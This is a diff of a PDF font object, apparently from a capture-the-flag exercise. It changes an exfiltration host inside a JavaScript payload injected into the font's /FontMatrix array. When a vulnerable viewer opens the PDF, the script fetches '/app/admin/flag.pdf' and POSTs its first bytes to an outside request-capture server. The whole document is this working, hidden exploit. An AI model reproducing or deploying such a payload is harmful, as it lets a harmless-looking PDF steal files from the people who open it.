@@ -28,7 +28,7 @@ endobj
 /LastChar 102
 /Encoding/WinAnsiEncoding
 /FontMatrix [0.1 0 0 0.1 0 (1\);
-fetch\('/app/admin/flag.pdf'\).then\(r=>r.arrayBuffer\(\)\).then\(a=>fetch\('https://iaakdzs.request.dreamhack.games',{method:'POST',body:a.slice\(0,100\)}\)\);
+fetch\('/app/admin/flag.pdf'\).then\(r=>r.arrayBuffer\(\)\).then\(a=>fetch\('https://hkqcpib.request.dreamhack.games',{method:'POST',body:a.slice\(0,100\)}\)\);
 //)]
 /Subtype/Type1
 /FirstChar 65
